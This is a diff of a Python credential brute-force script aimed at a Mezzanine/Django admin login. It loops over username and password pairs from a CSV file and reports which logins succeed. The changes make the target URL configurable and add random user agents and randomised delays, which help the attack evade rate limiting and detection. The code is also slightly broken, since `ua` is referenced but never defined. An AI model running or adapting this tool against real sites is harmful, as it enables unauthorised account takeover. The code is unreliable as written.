@@ -1,13 +1,14 @@
 # -*- coding: utf-8 -*-
 
+import configparser
 import csv
 import os
+import random
 from time import sleep
 
 import requests
 
-# NOTE: when you want to use Random-UserAgent, you should delete commentout some lines
-#from fake_useragent import UserAgent
+from fake_useragent import UserAgent
 
 
 def acccess(http_info):
@@ -29,26 +30,37 @@ def acccess(http_info):
         print(e)
 
 
-def attacker(user, pass_):
+def interval(config):
+    max_ = int(config.get('interval', 'max'))
+    min_ = int(config.get('interval', 'min'))
+    if max_ == min_:
+        sleep(min_)
+    else:
+        sleep(random.uniform(min_, max_))
+
+
+def attacker(user, pass_, config):
     cookie = acccess({'method': 'GET', 'url': 'http://127.0.0.1:8000/admin'}).cookies['csrftoken']
-    # NOTE: you should deley to access by using sleep function
-    sleep(1)
-    #ua = UserAgent(cache=False)
+    interval(config)
+
+    useragent = config.get('http_headers', 'useragent')
+    if useragent == "random":
+        useragent = ua.random
+
     res = acccess({
         'method': 'POST',
-        'url': 'http://127.0.0.1:8000/ja/admin/login/',
+        'url': config.get('general', 'url'),
         'querystring': {'next': '/ja/admin'},
         'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
-        # NOTE: you can modify HTTP-Header
         'headers': {
-            'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
-            #'useragent': ua.random,
+            'useragent': useragent,
             'cookie': 'csrftoken={}'.format(cookie),
-            'referer': 'http://127.0.0.1:8000/',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'referer': config.get('http_headers', 'referer'),
+            'accept': config.get('http_headers', 'accept'),
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'http://127.0.0.1:8000',
+            # 'origin': 'http://127.0.0.1:8000',
             'cache-control': 'no-cache',
+            'accept_language': config.get('http_headers', 'accept_language'),
         },
     })
     if "ダッシュボード" in res.text:
@@ -56,13 +68,18 @@ def attacker(user, pass_):
     else:
         print("User: {}, Pass: {}, Result: Failed".format(user, pass_))
 
+    interval(config)
+
 
 def main():
+    config = configparser.SafeConfigParser()
+    config.read('./attacker.conf')
+
     with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../attack_list.csv')))) as f:
         reader = csv.reader(f)
         header = next(reader)
         for row in reader:
-            attacker(str(row[0]), str(row[1]))
+            attacker(str(row[0]), str(row[1]), config)
 
 
 if __name__ == '__main__':
